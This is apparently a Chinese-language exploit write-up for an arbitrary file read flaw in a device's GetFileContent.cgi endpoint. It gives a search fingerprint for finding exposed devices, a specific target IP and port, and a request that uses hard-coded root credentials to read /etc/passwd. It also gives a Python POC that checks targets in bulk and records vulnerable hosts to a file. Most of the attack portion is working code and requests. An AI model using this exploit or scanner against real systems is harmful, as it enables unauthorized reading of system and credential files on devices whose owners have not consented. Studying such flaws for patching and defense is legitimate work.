## 一、资产搜索

```
body="local/NVT-string.js"
```

## 二、网站测试

```
http://175.215.64.92:10008
```

## 三、验证漏洞

```
/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605
```

![image-20240914152931634](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914152931634.png)

## 四、POC

```
def poc(target):
    payload = "/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "root" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"{target}\n")
                    f.close()
                    print(f"[+]{target}存在任意文件读取漏洞")
                    # return True
            else:
                print(f"[-]{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请手动测试！！！")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240914153314924](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914153314924.png)